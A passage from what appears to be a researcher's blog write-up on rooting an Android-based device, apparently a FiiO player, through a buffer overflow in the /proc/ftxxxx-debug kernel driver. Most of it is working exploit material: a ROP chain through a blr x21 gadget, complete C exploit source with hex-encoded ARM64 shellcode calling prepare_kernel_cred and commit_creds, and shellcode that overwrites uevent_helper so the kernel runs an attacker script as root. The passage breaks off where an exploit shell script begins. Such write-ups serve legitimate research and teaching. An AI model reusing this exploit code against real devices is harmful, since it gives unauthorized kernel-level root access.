  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">x21_overflow</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">x21_overflow</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">x21_overflow</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">x21_overflow</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">x21_overflow</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">x21_overflow</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">x21_overflow</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">x21_overflow</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">x21_overflow</span><span class="p">;</span>  

</pre></table></code></div></div><p>If the stack was executable, this address would then be deference and our junk data would be interpreted as code. It’s at least seemed worth a shot…</p><p><img data-src="/assets/img/img_fiio_exploit/pc_eq_x21.png" alt="pc_eq_x21" data-proofer-ignore></p><p>We can see above that our <code class="language-plaintext highlighter-rouge">PC</code> value and <code class="language-plaintext highlighter-rouge">x21</code> value are the same, indicating that our ROP chain seems to have executed properly. We also get the following line from the end of the kernel panic:</p><p><img data-src="/assets/img/img_fiio_exploit/call_trace_x43.png" alt="call_trace_x43" data-proofer-ignore></p><p>This error message seems to indicate that our <code class="language-plaintext highlighter-rouge">0x43</code>s are being interpreted as valid instructions, but it’s still hard to tell. Maybe the error message is just a fluke?</p><p>I changed the entire chain to be NOPs, except the last line, which was still our <code class="language-plaintext highlighter-rouge">x21_overflow</code> junk data.</p><div class="language-cpp highlighter-rouge"><div class="code-header"> <span data-label-text="Cpp"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="kt">uint64_t</span> <span class="n">nop</span> <span class="o">=</span> <span class="mh">0xd503201fd503201f</span><span class="p">;</span>

<span class="c1">// ... previous code ...</span>
  <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">chain</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">blr_x21</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">nop</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">nop</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">nop</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">nop</span><span class="p">;</span>  

<span class="c1">// ... continue chain</span>

  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">nop</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">x21_overflow</span><span class="p">;</span>  
</pre></table></code></div></div><p>If the code on the stack was actually executing, it would go down the NOP sled before throwing the same error. Furthermore, our PC would now point to a different address than <code class="language-plaintext highlighter-rouge">x21</code>, since it successfully executed instructions.</p><p><img data-src="/assets/img/img_fiio_exploit/x21_neq_pc.png" alt="x21_neq_pc" data-proofer-ignore> <img data-src="/assets/img/img_fiio_exploit/nop_code_trace.png" alt="nop_code_trace" data-proofer-ignore></p><p>I was honestly in disbelief that this worked. We now have a very simple gadget which reliably allows us to jump to our own shellcode, executing in supervisor mode (EL1).</p><h2 id="writing-the-shellcode"><span class="mr-2">Writing The Shellcode:</span><a href="#writing-the-shellcode" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The obvious next step was to come up with our shellcode. In order to do that, we need to grab the addresses for both <code class="language-plaintext highlighter-rouge">commit_creds</code> and <code class="language-plaintext highlighter-rouge">prepare_kernel_cred</code></p><p><img data-src="/assets/img/img_fiio_exploit/prepare_and_commit_addr.png" alt="prepare_and_commit_addr" data-proofer-ignore></p><p>After that, we can start putting together some ARM64 assembly:</p><pre><code class="language-arch64">mov x0, xzr              // move 0x0 into x0 
mov x2,  #0x6368         // mov addr of prepare_kernel_cred into x2
movk x2, #0x000b, lsl #16  
movk x2, #0xffc0, lsl #32  
movk x2, #0xffff, lsl #48  
blr x2                   // branch to addr in x2
mov x4,  #0x5ffc         // mov addr of commit_creds into x4
movk x4, #0x000b, lsl #16  
movk x4, #0xffc0, lsl #32  
movk x4, #0xffff, lsl #48  
blr x4                   // branch to addr in x4

...

</code></pre><p>This code works as follows:</p><ol><li>Move 0x0 into <code class="language-plaintext highlighter-rouge">x0</code>. ARM64 specifies that <code class="language-plaintext highlighter-rouge">x0</code> will always hold the first argument when a function is called. We want the argument passed to <code class="language-plaintext highlighter-rouge">prepare_kernel_cred</code> to be NULL, which is equivalent to 0x0<li>Load the address of <code class="language-plaintext highlighter-rouge">prepare_kernel_cred</code> into <code class="language-plaintext highlighter-rouge">x2</code> and branch to it<li>The return value of <code class="language-plaintext highlighter-rouge">prepare_kernel_cred</code> is a pointer to the newly created credential. ARM64 specifies that all return values will be passed back to the callee in <code class="language-plaintext highlighter-rouge">x0</code>. This works out for us, because the next step is to call <code class="language-plaintext highlighter-rouge">commit_creds</code> with a pointer to our cred argument in <code class="language-plaintext highlighter-rouge">x0</code>. Thus we don’t have to do anything when <code class="language-plaintext highlighter-rouge">prepare_kernel_cred</code> returns<li>Load the address of <code class="language-plaintext highlighter-rouge">commit_creds</code> into <code class="language-plaintext highlighter-rouge">x4</code> and branch to it.</ol><p>After this, we need to switch out of supervisor mode and cleanly return to userland. This is where things became significantly less straightforward. A few things need to happen:</p><ol><li>We need to specify what address to return to<li>We need to restore the userland stack pointer<li>We need to set saved program status registers</ol><p>The good news is that because <code class="language-plaintext highlighter-rouge">x21</code> consistently holds a pointer into our user-controlled data, we can pass a userland stack pointer and userland return value via our buffer overflow payload.</p><p>To debug this, we will compile the above shellcode which doesn’t yet return from supervisor mode. We will make the last instruction <code class="language-plaintext highlighter-rouge">0x41414141</code>, causing a kernel panic and allowing us to dump the register states. Our exploit payload will include a bogus stack pointer and the address of the function we wish to return to. We can then review the kernel panic logs in order to determine the offsets and finish out our shellcode. In all, our exploit functions look as follows:</p><div class="language-cpp highlighter-rouge"><div class="code-header"> <span data-label-text="Cpp"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="c1">  </span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="c1">  </span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="c1">  </span><span class="cp">
#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="c1">  </span><span class="cp">
#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="c1">  </span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="c1">  </span><span class="cp">
#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="c1">  </span><span class="cp">
#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="c1">  </span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="c1">  </span><span class="cp">
#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="c1">  </span><span class="cp">
#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="c1">  </span><span class="cp">
#include</span> <span class="cpf">&lt;sys/wait.h&gt;</span><span class="c1">  </span><span class="cp">
#include</span> <span class="cpf">&lt;spawn.h&gt;</span><span class="c1">  </span><span class="cp">
</span>  
<span class="kt">uint64_t</span> <span class="n">kernel_base</span> <span class="o">=</span> <span class="mh">0xFFFFFFC000080000ULL</span><span class="p">;</span>  
<span class="kt">uint64_t</span> <span class="n">blr_x21</span> <span class="o">=</span> <span class="mh">0x000000000001e664ULL</span> <span class="o">+</span> <span class="n">kernel_base</span><span class="p">;</span>  
<span class="kt">uint64_t</span> <span class="n">nop</span> <span class="o">=</span> <span class="mh">0xd503201fd503201f</span><span class="p">;</span>  
<span class="kt">uint64_t</span> <span class="n">junk</span> <span class="o">=</span> <span class="mh">0x4242424242424242ULL</span><span class="p">;</span>  
  
<span class="k">static</span> <span class="kt">int</span> <span class="nf">win</span><span class="p">()</span> <span class="p">{</span>  
  <span class="n">puts</span><span class="p">(</span><span class="s">"[+] Returned from supervisor mode</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>  
  <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">"busybox1.11"</span><span class="p">,</span> <span class="s">"touch"</span><span class="p">,</span> <span class="s">"/data/local/tmp/test.txt"</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">};</span>  
  <span class="kt">char</span> <span class="o">*</span><span class="n">envp</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="nb">NULL</span> <span class="p">};</span> 
  <span class="n">puts</span><span class="p">(</span><span class="s">"[!] Win</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
  <span class="n">execve</span><span class="p">(</span><span class="s">"/system/bin/busybox1.11"</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span> 
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>  
<span class="p">}</span>  
  
<span class="k">static</span> <span class="kt">int</span> <span class="n">exploit</span><span class="p">()</span> <span class="p">{</span>  
  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>  
  <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/proc/ftxxxx-debug"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>  
  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>  
  <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>  
  <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mi">1023</span><span class="p">);</span>  

  <span class="kt">uint64_t</span> <span class="n">stack_size</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">;</span>  
  <span class="kt">void</span> <span class="o">*</span><span class="n">stack_base</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">stack_size</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span> <span class="o">|</span> <span class="n">MAP_STACK</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>  
  <span class="k">if</span><span class="p">(</span><span class="n">stack_base</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="p">{</span>  
    <span class="n">puts</span><span class="p">(</span><span class="s">"[!] mmap failed!"</span><span class="p">);</span>  
    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>  
  <span class="p">}</span>  
  <span class="kt">void</span> <span class="o">*</span><span class="n">stack_top</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)((</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">stack_base</span> <span class="o">+</span> <span class="n">stack_size</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Stack Pointer: %llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">stack_top</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"[+] win() address: %llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">win</span><span class="p">);</span>

  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>  
    <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0x8c</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span>  
    <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xa0</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span>  
    <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0xd6</span><span class="p">,</span>  
    <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xa0</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span>  
    <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span>  
    <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0xd6</span><span class="p">,</span>  
    <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span>   <span class="c1">// Bad Instruction to cause kernel panic</span>
  <span class="p">};</span>  

  <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">chain</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">blr_x21</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">junk</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">junk</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">junk</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">((</span><span class="kt">uint64_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">win</span><span class="p">);</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)((</span><span class="kt">uint64_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">stack_top</span><span class="p">);</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">nop</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">nop</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">nop</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">nop</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">nop</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">nop</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">nop</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">nop</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">nop</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">nop</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">nop</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">nop</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">nop</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">nop</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">nop</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">nop</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">nop</span><span class="p">;</span>  
  <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">nop</span><span class="p">;</span>  

  <span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span> <span class="o">+</span> <span class="mi">1216</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>  
  <span class="n">puts</span><span class="p">(</span><span class="s">"[+] Ropping to shellcode..."</span><span class="p">);</span>  
  <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">1024</span> <span class="o">+</span> <span class="mi">1216</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>  
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>  
<span class="p">}</span>  
  
<span class="kt">int</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>  
  <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[+] Starting trigger...</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>  
  <span class="n">exploit</span><span class="p">();</span>  
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>  
<span class="p">}</span>
</pre></table></code></div></div><p>Running it, we get a kernel panic as expected.</p><p><img data-src="/assets/img/img_fiio_exploit/all_regs_kernel_crash.png" alt="all_regs_kernel_crash" data-proofer-ignore></p><p>Lets break down the kernel crash logs. First of all, we see that <code class="language-plaintext highlighter-rouge">x0</code> is equal to <code class="language-plaintext highlighter-rouge">0x0</code>. This is what we want to see - <code class="language-plaintext highlighter-rouge">commit_creds</code> returns a 0 if completed execution without issue, so we can take this as an indicator that our shellcode was able to successfully execute. Also note that <code class="language-plaintext highlighter-rouge">x21</code> is equal to <code class="language-plaintext highlighter-rouge">0xffffffc01521fec8</code>.</p><p>Scrolling down, the crash dump gives us the data where <code class="language-plaintext highlighter-rouge">x21</code> is currently pointing. Note that data before and after the actual pointer is shown (<code class="language-plaintext highlighter-rouge">x21</code> is pointing at the <code class="language-plaintext highlighter-rouge">fec8</code> line).</p><p><img data-src="/assets/img/img_fiio_exploit/x21_contents.png" alt="x21_contents" data-proofer-ignore></p><p>We can note that our <code class="language-plaintext highlighter-rouge">win()</code> address (<code class="language-plaintext highlighter-rouge">0x0000000078942300</code>) is stored at <code class="language-plaintext highlighter-rouge">x21 - 0x80</code>. The next 8 bytes are our bogus stack pointer which we <code class="language-plaintext highlighter-rouge">mmapped</code> before the payload. With this information, we can finish out our shellcode to return to usermode:</p><pre><code class="language-asm">// ... previous code ...
sub x2, x21, #0x80  // store pointer to win address in x2
ldr x1, [x2]        // deref pointer into x1. x1 now holds win() address
ldr x4, [x2, #0x08] // deref pointer+0x8 into x4. x4 now holds fake stack pointer
mov x0, xzr         // move 0 into x0 
MSR SP_EL0, x4      // set EL0 (usermode) stack pointer to x4
MSR ELR_EL1, x1     // set EL1 (kernelmode) return address to x1
MSR SPSR_EL1, x0    // set status regs to 0x0
ERET
</code></pre><p>Game over, right?</p><p><img data-src="/assets/img/img_fiio_exploit/segfault.png" alt="segfault" data-proofer-ignore></p><p>Not quite. We do successfully return from supervisor mode with our elevated privs. However, as soon as we try to make another syscall, the program segfaults. The device itself doesn’t crash, but our program stops running. Because we <em>did</em> elevate our privs on the process itself, we have root for a nanosecond, but we can’t even do anything interesting with it.</p><p>I spent over a week trying to debug this issue (which looking back on it, was way too much time). The segfault almost certainly stemmed from the ugly way the shellcode <code class="language-plaintext highlighter-rouge">ERET</code> back to userspace without taking into account the previous state, the call stack, or any other information. I tried numerous techniques to save / restore the state and jump to different areas of my code, but nothing seemed to work. Being so close to having a root shell, I was reluctant to step back and try a different approach. But after officially running out of ideas, I went back to the drawing board.</p><h2 id="back-to-the-drawing-board"><span class="mr-2">Back To The Drawing Board:</span><a href="#back-to-the-drawing-board" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>To recap, we currently have the following:</p><ol><li>Read, write, and execute primitives in EL1 (supervisor mode)<li>The ability to return from supervisor mode without crashing the kernel, but without being able to make another syscall or fork our current process.</ol><p>With this information, I went to Google and started poking around. I should also shout out some friends in one of my private exploit dev discords who provided a few suggestions. In the end, however, it was a <a href="https://powerofcommunity.net/poc2016/x82.pdf">random slidedeck from 2016</a> which gave the breakthrough.</p><h3 id="the-hotplugeater-attack"><span class="mr-2">The HotplugEater Attack:</span><a href="#the-hotplugeater-attack" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>This presentation by dong-hoon you presented a technique he called the HotplugEater Attack. I have included the relevant slide below:</p><p><img data-src="/assets/img/img_fiio_exploit/hotplug_eater_slide.png" alt="hotplug_eater_slide" data-proofer-ignore></p><p>The idea is as follows:</p><ul><li>The global variable <code class="language-plaintext highlighter-rouge">uevent_helper</code> points to a script which the kernel uses on a hotplug event.<li>If we can overwrite this variable to point to an attacker controlled script, it will execute with root permissions.<li>Simply changing the variable is enough to trigger the <code class="language-plaintext highlighter-rouge">kobject_uevent_env</code> function, which will in turn call our malicious script.</ul><h2 id="putting-it-all-together"><span class="mr-2">Putting It All Together:</span><a href="#putting-it-all-together" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We can dump the address of <code class="language-plaintext highlighter-rouge">uevent_helper</code> with the Python script we used earlier. <img data-src="/assets/img/img_fiio_exploit/uevent_helper.png" alt="uevent_helper" data-proofer-ignore></p><p>Our new exploit will now work as follows:</p><ol><li>Create a script in <code class="language-plaintext highlighter-rouge">/data/local/tmp/</code> which we want to execute with root permissions<li>Trigger our overflow on <code class="language-plaintext highlighter-rouge">ftxxxx-debug</code> and ROP to our shellcode<li>The shellcode will overwrite <code class="language-plaintext highlighter-rouge">uevent_helper</code> with the path to our malcious script in <code class="language-plaintext highlighter-rouge">/data/local/tmp</code>, return to usermode, and gracefully exit (by way of segfaulting).<li>After ~10 seconds, the kernel will execute our script</ol><p>With this in mind, we need to write some new shellcode which performs the actions outlined in point number 3. That shellcode has been included and commented below:</p><pre><code class="language-asm">mov x2,  #0xc7c8          // move the address of `uevent_helper` into x2
movk x2, #0x00c2, lsl #16  
movk x2, #0xffc0, lsl #32  
movk x2, #0xffff, lsl #48  
  
mov w3, #'/'              // store the value `/data/local/tmp/cmd` byte by byte at x2 
strb w3, [x2]  
mov w3, #'d'  
strb w3, [x2, #1]  
mov w3, #'a'  
strb w3, [x2, #2]  
mov w3, #'t'  
strb w3, [x2, #3]  
mov w3, #'a'  
strb w3, [x2, #4]  
mov w3, #'/'  
strb w3, [x2, #5]  
mov w3, #'l'  
strb w3, [x2, #6]  
mov w3, #'o'  
strb w3, [x2, #7]  
mov w3, #'c'  
strb w3, [x2, #8]  
mov w3, #'a'  
strb w3, [x2, #9]  
mov w3, #'l'  
strb w3, [x2, #10]  
mov w3, #'/'  
strb w3, [x2, #11]  
mov w3, #'t'  
strb w3, [x2, #12]  
mov w3, #'m'  
strb w3, [x2, #13]  
mov w3, #'p'  
strb w3, [x2, #14]  
mov w3, #'/'  
strb w3, [x2, #15]  
mov w3, #'c'  
strb w3, [x2, #16]  
mov w3, #'m'  
strb w3, [x2, #17]  
mov w3, #'d'  
strb w3, [x2, #18]  
mov x3, xzr               // terminate our string with a null byte by moving 0x0 into x3 and storing x3 at x2 + 19
str x3, [x2, #19]  
  
sub x2, x21, #0x80        // ret to our win() function the same way we did in the previous shellcode
ldr x1, [x2]  
ldr x4, [x2, #0x08]  
mov x0, xzr  
MSR SP_EL0, x4  
MSR ELR_EL1, x1  
MSR SPSR_EL1, x0  
ERET
</code></pre><p>We can create an exploit bash script which does the following:</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
